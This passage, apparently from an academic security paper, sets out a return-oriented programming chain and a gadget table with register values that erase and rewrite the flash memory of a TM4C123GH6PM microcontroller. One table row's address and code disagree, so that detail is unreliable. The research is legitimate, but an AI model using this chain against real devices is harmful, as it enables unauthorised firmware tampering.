The design of the ROP was taken directly from the code in Figures \ref{fig::erase} and \ref{fig::alt_prog}. The gadgets in Figure \ref{fig::gadget1} were combined in a pipelined fashion in order to minimize operations. Our implementation was still rather bulky at 13 required returns. The number of returns could have been reduced by finding gadgets containing the STR2 command, which stores two words at an address. Table \ref{tab:gadgets} describes the order that the gadgets should be executed in order to rewrite the flash memory of the TM4C123GH6PM.

% Table generated by Excel2LaTeX from sheet 'Sheet1'
\begin{table}[htbp]
  \centering
  \caption{Proposed ROP attack configuration. }
    \begin{tabular}{rrr}
    \toprule
    \multicolumn{1}{c}{Gadget} & \multicolumn{1}{c}{R4 input} & \multicolumn{1}{c}{Resulting code} \\
    \midrule
    \multicolumn{1}{l}{Aa} & \multicolumn{1}{l}{0x00004800} & \multicolumn{1}{l}{\textit{// Erase procedure}} \\
    \multicolumn{1}{l}{B} & \multicolumn{1}{l}{0x400FD000} & \multicolumn{1}{l}{uint32\_t * FLASH = (uint32\_t *) 0x400FD000;} \\
    \multicolumn{1}{l}{A} & \multicolumn{1}{l}{0xA4420002} & \multicolumn{1}{l}{FLASH[0x0] = 0x4800;} \\
    \multicolumn{1}{l}{B} & \multicolumn{1}{l}{0x400FD008} & \multicolumn{1}{l}{FLASH[0x8/4] = 0xA4420002;} \\
    \multicolumn{1}{l}{A} & \multicolumn{1}{l}{0x00004BD8} & \multicolumn{1}{l}{\textit{// Write procedure}} \\
    \multicolumn{1}{l}{B} & \multicolumn{1}{l}{0x400FD000} & \multicolumn{1}{l}{FLASH[0x0] = 0x4BD8;} \\
    \multicolumn{1}{l}{A} & \multicolumn{1}{l}{0xF1000001} &  \\
    \multicolumn{1}{l}{B} & \multicolumn{1}{l}{0x400FD100} & \multicolumn{1}{l}{FLASH[0x100/4] = 0xF1000001;} \\
    \multicolumn{1}{l}{A} & \multicolumn{1}{l}{0xE7FC****} &  \\
    \multicolumn{1}{l}{B} & \multicolumn{1}{l}{0x400FD104} & \multicolumn{1}{l}{FLASH[0x104/4] = 0xE7FC****;} \\
    \multicolumn{1}{l}{A} & \multicolumn{1}{l}{0xFFFFFFFF} & \multicolumn{1}{l}{} \\
    \multicolumn{1}{l}{B} & \multicolumn{1}{l}{0x400FD030} & \multicolumn{1}{l}{FLASH[0x30/4]=0xFFFFFFFF;} \\
    \multicolumn{1}{l}{A} & \multicolumn{1}{l}{0xA4420001} &  \\
    \multicolumn{1}{l}{B} & \multicolumn{1}{l}{0x400FD020} & \multicolumn{1}{l}{FLASH[0x8/4] = 0xA4420001;} \\
    \multicolumn{1}{l}{A} &            & \multicolumn{1}{l}{\textit{// Return to 0x4BD8}} \\
    \bottomrule
    \end{tabular}%
  \label{tab:gadgets}%
\end{table}%
